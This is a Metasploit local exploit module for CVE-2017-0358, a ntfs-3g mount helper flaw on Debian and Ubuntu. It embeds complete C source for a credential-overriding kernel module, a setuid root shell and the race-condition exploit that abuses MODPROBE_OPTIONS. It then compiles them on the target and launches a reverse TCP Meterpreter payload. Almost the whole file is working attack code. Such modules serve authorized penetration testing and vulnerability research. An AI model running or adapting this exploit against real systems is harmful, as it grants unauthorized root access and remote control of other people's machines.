##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'Debian/Ubuntu ntfs-3g Local Privilege Escalation',
        'Description'   => %q{
          Ubuntu 16.04, 16.10 and Debian 7, 8, ?9? ntfs-3g mount helper does not properly sanitize the environment when executing modprobe.
          This can be abused to load a kernel module and execute a binary payload.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'jannh@google.com',                    # discovery
            'h00die <mike@shorebreaksecurity.com>' # metasploit module
          ],
        'Platform'      => [ 'linux' ],
        'Arch'          => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'References'    =>
          [
            [ 'CVE', '2017-0358' ],
            [ 'EDB', '41356' ],
            [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1072' ]
          ],
        'Targets'       =>
          [
            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
            [ 'Linux x64',       { 'Arch' => ARCH_X64 } ]
          ],
        'DefaultOptions' =>
          {
            'payload' => 'linux/x64/mettle/reverse_tcp',
            'PrependFork' => true,
            },
        'DefaultTarget' => 1,
        'DisclosureDate' => 'Jan 05 2017',
        'Privileged'     => true
      }
      ))
    register_options([
        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
      ], self.class)
  end

  def check

    # check if linux headers were installed on Debian (not ubuntu). The 'common' headers won't work.
    def headers_installed?()
      output = cmd_exec('dpkg -l | grep \'^ii\' | grep linux-headers.*[^common]{7}')
      if output
        if output.include?('linux-headers')
          return true
        else
          print_error('Linux kernel headers not available, compiling will fail.')
          return false
        end
      end
      false
    end

    output = cmd_exec('dpkg -l | grep \'^ii\' | grep ntfs-3g')
    if output
      if output.include?('1:2015.3.14AR.1-1build1') #Ubuntu 16.04 LTS
        print_good('Vulnerable Ubuntu 16.04 detected')
        CheckCode::Appears
      elsif output.include?('1:2016.2.22AR.1-3') #Ubuntu 16.10
        print_good('Vulnerable Ubuntu 16.10 detected')
        CheckCode::Appears
      elsif output.include?('1:2012.1.15AR.5-2.1+deb7u2') #Debian Wheezy, we also need linux-source installed
        print_good('Vulnerable Debian 7 (wheezy) detected')
        if headers_installed?()
          CheckCode::Appears
        else
          CheckCode::Safe
        end
        CheckCode::Appears
      elsif output.include?('1:2014.2.15AR.2-1+deb8u2') #Debian Jessie, we also need linux-source installed
        print_good('Vulnerable Debian 8 (jessie) detected')
        if headers_installed?()
          CheckCode::Appears
        else
          CheckCode::Safe
        end
        CheckCode::Appears
      else
        print_error("Version installed not vulnerable: #{output}")
        CheckCode::Safe
      end
    else
      print_error('ntfs-3g not installed')
      CheckCode::Safe
    end
  end

  def exploit
    def upload_and_compile(filename, file_path, file_content, compile=nil)
      rm_f "#{file_path}"
      if not compile.nil?
        rm_f "#{file_path}.c"
        vprint_status("Writing #{filename} to #{file_path}.c")
        write_file("#{file_path}.c", file_content)
        register_file_for_cleanup("#{file_path}.c")
        output = cmd_exec(compile)
        if output != ''
          print_error(output)
          fail_with(Failure::Unknown, "#{filename} at #{file_path}.c failed to compile")
        end
      else
        vprint_status("Writing #{filename} to #{file_path}")
        write_file(file_path, file_content)
      end
      cmd_exec("chmod +x #{file_path}");
      register_file_for_cleanup(file_path)
    end

    # These are direct copies of the modules from EDB
    rootmod = %q{
      #include <linux/module.h>
      #include <linux/kernel.h>
      #include <linux/cred.h>
      #include <linux/syscalls.h>
      #include <linux/kallsyms.h>

      static int suidfile_fd = -1;
      module_param(suidfile_fd, int, 0);

      static int __init init_rootmod(void) {
        int (*sys_fchown_)(int fd, int uid, int gid);
        int (*sys_fchmod_)(int fd, int mode);
        const struct cred *kcred, *oldcred;

        sys_fchown_ = (void*)kallsyms_lookup_name("sys_fchown");
        sys_fchmod_ = (void*)kallsyms_lookup_name("sys_fchmod");

        printk(KERN_INFO "rootmod loading\n");
        kcred = prepare_kernel_cred(NULL);
        oldcred = override_creds(kcred);
        sys_fchown_(suidfile_fd, 0, 0);
        sys_fchmod_(suidfile_fd, 06755);
        revert_creds(oldcred);
        return -ELOOP; /* fake error because we don't actually want to end up with a loaded module */
      }

      static void __exit cleanup_rootmod(void) {}

      module_init(init_rootmod);
      module_exit(cleanup_rootmod);

      MODULE_LICENSE("GPL v2");
    }

    rootshell = %q{
      #include <unistd.h>
      #include <err.h>
      #include <stdio.h>
      #include <sys/types.h>

      int main(void) {
        if (setuid(0) || setgid(0))
          err(1, "setuid/setgid");
        fputs("we have root privs now...\n", stderr);
        execl("/bin/bash", "bash", NULL);
        err(1, "execl");
      }
    }

    sploit = %q{
      #define _GNU_SOURCE
      #include <stdbool.h>
      #include <errno.h>
      #include <sys/inotify.h>
      #include <unistd.h>
      #include <err.h>
      #include <stdlib.h>
      #include <sys/stat.h>
      #include <sys/types.h>
      #include <fcntl.h>
      #include <sys/eventfd.h>
      #include <signal.h>
      #include <poll.h>
      #include <stdio.h>
      #include <sys/prctl.h>
      #include <string.h>
      #include <sys/wait.h>
      #include <time.h>
      #include <sys/utsname.h>

      int main(void) {
        /* prevent shell from backgrounding ntfs-3g when stopped */
        pid_t initial_fork_child = fork();
        if (initial_fork_child == -1)
          err(1, "initial fork");
        if (initial_fork_child != 0) {
          int status;
          if (waitpid(initial_fork_child, &status, 0) != initial_fork_child)
            err(1, "waitpid");
          execl("rootshell", "rootshell", NULL);
          exit(0);
        }

        char buf[1000] = {0};
        // Set up workspace with volume, mountpoint, modprobe config and module directory.
        char template[] = "/tmp/ntfs_sploit.XXXXXX";
        if (mkdtemp(template) == NULL)
          err(1, "mkdtemp");
        char volume[100], mountpoint[100], modprobe_confdir[100], modprobe_conffile[100];
        sprintf(volume, "%s/volume", template);
        sprintf(mountpoint, "%s/mountpoint", template);
        sprintf(modprobe_confdir, "%s/modprobe.d", template);
        sprintf(modprobe_conffile, "%s/sploit.conf", modprobe_confdir);
        if (mkdir(volume, 0777) || mkdir(mountpoint, 0777) || mkdir(modprobe_confdir, 0777))
          err(1, "mkdir");
        int conffd = open(modprobe_conffile, O_WRONLY|O_CREAT, 0666);
        if (conffd == -1)
          err(1, "open modprobe config");
        int suidfile_fd = open("rootshell", O_RDONLY);
        if (suidfile_fd == -1)
          err(1, "unable to open ./rootshell");
        char modprobe_config[200];
        sprintf(modprobe_config, "alias fuse rootmod\noptions rootmod suidfile_fd=%d\n", suidfile_fd);
        if (write(conffd, modprobe_config, strlen(modprobe_config)) != strlen(modprobe_config))
          errx(1, "modprobe config write failed");
        close(conffd);
        // module directory setup
        char system_cmd[1000];
        sprintf(system_cmd, "mkdir -p %s/lib/modules/$(uname -r) && cp rootmod.ko *.bin %s/lib/modules/$(uname -r)/",
          template, template);
        if (system(system_cmd))
          errx(1, "shell command failed");

        // Set up inotify watch for /proc/mounts.
        // Note: /proc/mounts is a symlink to /proc/self/mounts, so
        // the watch will only see accesses by this process.
        int inotify_fd = inotify_init1(IN_CLOEXEC);
        if (inotify_fd == -1)
          err(1, "unable to create inotify fd?");
        if (inotify_add_watch(inotify_fd, "/proc/mounts", IN_OPEN) == -1)
          err(1, "unable to watch /proc/mounts");

        // Set up inotify watch for /proc/filesystems.
        // This can be used to detect whether we lost the race.
        int fs_inotify_fd = inotify_init1(IN_CLOEXEC);
        if (fs_inotify_fd == -1)
          err(1, "unable to create inotify fd?");
        if (inotify_add_watch(fs_inotify_fd, "/proc/filesystems", IN_OPEN) == -1)
          err(1, "unable to watch /proc/filesystems");

        // Set up inotify watch for /sbin/modprobe.
        // This can be used to detect when we can release all our open files.
        int modprobe_inotify_fd = inotify_init1(IN_CLOEXEC);
        if (modprobe_inotify_fd == -1)
          err(1, "unable to create inotify fd?");
        if (inotify_add_watch(modprobe_inotify_fd, "/sbin/modprobe", IN_OPEN) == -1)
          err(1, "unable to watch /sbin/modprobe");

        int do_exec_pipe[2];
        if (pipe2(do_exec_pipe, O_CLOEXEC))
          err(1, "pipe");
        pid_t child = fork();
        if (child == -1)
          err(1, "fork");
        if (child != 0) {
          if (read(do_exec_pipe[0], buf, 1) != 1)
            errx(1, "pipe read failed");
          char modprobe_opts[300];
          sprintf(modprobe_opts, "-C %s -d %s", modprobe_confdir, template);
          setenv("MODPROBE_OPTIONS", modprobe_opts, 1);
          execlp("ntfs-3g", "ntfs-3g", volume, mountpoint, NULL);
        }
        child = getpid();

        // Now launch ntfs-3g and wait until it opens /proc/mounts
        if (write(do_exec_pipe[1], buf, 1) != 1)
          errx(1, "pipe write failed");

        if (read(inotify_fd, buf, sizeof(buf)) <= 0)
          errx(1, "inotify read failed");
        if (kill(getppid(), SIGSTOP))
          err(1, "can't stop setuid parent");

        // Check whether we won the main race.
        struct pollfd poll_fds[1] = {{
          .fd = fs_inotify_fd,
          .events = POLLIN
        }};
        int poll_res = poll(poll_fds, 1, 100);
        if (poll_res == -1)
          err(1, "poll");
        if (poll_res == 1) {
          puts("looks like we lost the race");
          if (kill(getppid(), SIGKILL))
            perror("SIGKILL after lost race");
          char rm_cmd[100];
          sprintf(rm_cmd, "rm -rf %s", template);
          system(rm_cmd);
          exit(1);
        }
        puts("looks like we won the race");

        // Open as many files as possible. Whenever we have
        // a bunch of open files, move them into a new process.
        int total_open_files = 0;
        while (1) {
          #define LIMIT 500
          int open_files[LIMIT];
          bool reached_limit = false;
          int n_open_files;
          for (n_open_files = 0; n_open_files < LIMIT; n_open_files++) {
            open_files[n_open_files] = eventfd(0, 0);
            if (open_files[n_open_files] == -1) {
              if (errno != ENFILE)
                err(1, "eventfd() failed");
              printf("got ENFILE at %d total\n", total_open_files);
              reached_limit = true;
              break;
            }
            total_open_files++;
          }
          pid_t fd_stasher_child = fork();
          if (fd_stasher_child == -1)
            err(1, "fork (for eventfd holder)");
          if (fd_stasher_child == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            // close PR_SET_PDEATHSIG race window
            if (getppid() != child) raise(SIGKILL);
            while (1) pause();
          }
          for (int i = 0; i < n_open_files; i++)
            close(open_files[i]);
          if (reached_limit)
            break;
        }

        // Wake up ntfs-3g and keep allocating files, then free up
        // the files as soon as we're reasonably certain that either
        // modprobe was spawned or the attack failed.
        if (kill(getppid(), SIGCONT))
          err(1, "SIGCONT");

        time_t start_time = time(NULL);
        while (1) {
          for (int i=0; i<1000; i++) {
            int efd = eventfd(0, 0);
            if (efd == -1 && errno != ENFILE)
              err(1, "gapfiller eventfd() failed unexpectedly");
          }
          struct pollfd modprobe_poll_fds[1] = {{
            .fd = modprobe_inotify_fd,
            .events = POLLIN
          }};
          int modprobe_poll_res = poll(modprobe_poll_fds, 1, 0);
          if (modprobe_poll_res == -1)
            err(1, "poll");
          if (modprobe_poll_res == 1) {
            puts("yay, modprobe ran!");
            exit(0);
          }
          if (time(NULL) > start_time + 3) {
            puts("modprobe didn't run?");
            exit(1);
          }
        }
      }
    }

    rootmod_filename = 'rootmod'
    rootmod_path = "#{datastore['WritableDir']}/#{rootmod_filename}"
    rootshell_filename = 'rootshell'
    rootshell_path = "#{datastore['WritableDir']}/#{rootshell_filename}"
    sploit_filename = 'sploit'
    sploit_path = "#{datastore['WritableDir']}/#{sploit_filename}"
    payload_filename = rand_text_alpha(8)
    payload_path = "#{datastore['WritableDir']}/#{payload_filename}"

    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')
    end

    def has_prereqs?()
      def check_gcc?()
        gcc = cmd_exec('which gcc')
        if gcc.include?('gcc')
          vprint_good('gcc is installed')
          return true
        else
          print_error('gcc is not installed.  Compiling will fail.')
          return false
        end
      end

      def check_make?()
        make = cmd_exec('which make')
        if make.include?('make')
          vprint_good('make is installed')
          return true
        else
          print_error('make is not installed.  Compiling will fail.')
          return false
        end
      end

      return check_make?() && check_gcc?()
    end

    if has_prereqs?()
      vprint_status('Live compiling exploit on system')
    else
      fail_with(Failure::Unknown, 'make and gcc required on system to build exploit for kernel')
    end

    # make our substitutions so things are dynamic
    rootshell.gsub!(/execl\("\/bin\/bash", "bash", NULL\);/,
               "return execl(\"#{payload_path}\", \"\", NULL);") #launch our payload, and do it in a return to not freeze the executable
    print_status('Writing files to target')
    cmd_exec("cd #{datastore['WritableDir']}")

    #write all the files and compile.  This is equivalent to the original compile.sh
    #gcc -o rootshell rootshell.c -Wall
    upload_and_compile('rootshell', rootshell_path, rootshell, "gcc -o #{rootshell_filename} #{rootshell_filename}.c -Wall")
    #gcc -o sploit sploit.c -Wall -std=gnu99
    upload_and_compile('sploit', sploit_path, sploit, "gcc -o #{sploit_filename} #{sploit_filename}.c -Wall -std=gnu99")
    #make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
    upload_and_compile('rootmod', "#{rootmod_path}.c", rootmod, nil)
    upload_and_compile('Makefile', "#{datastore['WritableDir']}/Makefile", 'obj-m := rootmod.o', nil)
    cmd_exec('make -C /lib/modules/$(uname -r)/build M=$(pwd) modules')
    upload_and_compile('payload', payload_path, generate_payload_exe)

    #This is equivalent to the 2nd half of the compile.sh file
    cmd_exec('mkdir -p depmod_tmp/lib/modules/$(uname -r)')
    cmd_exec('cp rootmod.ko depmod_tmp/lib/modules/$(uname -r)/')
    cmd_exec('/sbin/depmod -b depmod_tmp/')
    cmd_exec('cp depmod_tmp/lib/modules/$(uname -r)/*.bin .')
    cmd_exec('rm -rf depmod_tmp')

    register_file_for_cleanup("#{rootmod_path}.ko")
    register_file_for_cleanup("#{rootmod_path}.mod.c")
    register_file_for_cleanup("#{rootmod_path}.mod.o")
    register_file_for_cleanup("#{rootmod_path}.o")

    # and here we go!
    print_status('Starting execution of priv esc.')
    output = cmd_exec(sploit_path)
    unless session_created?
      # this could also be output.include?('we have root privs now...'), however session_created handles some additional cases like elevation happened,
      # but binary payload was caught, or NIPS shut down the callback etc.
      vprint_error(output)
    end
  end

  def on_new_session(session)
    # if we don't /bin/bash here, our payload times out
    # [*] Meterpreter session 2 opened (192.168.199.131:4444 -> 192.168.199.130:37022) at 2016-09-27 14:15:04 -0400
    # [*] 192.168.199.130 - Meterpreter session 2 closed.  Reason: Died
    session.shell_command_token('/bin/bash')
    super
  end
end
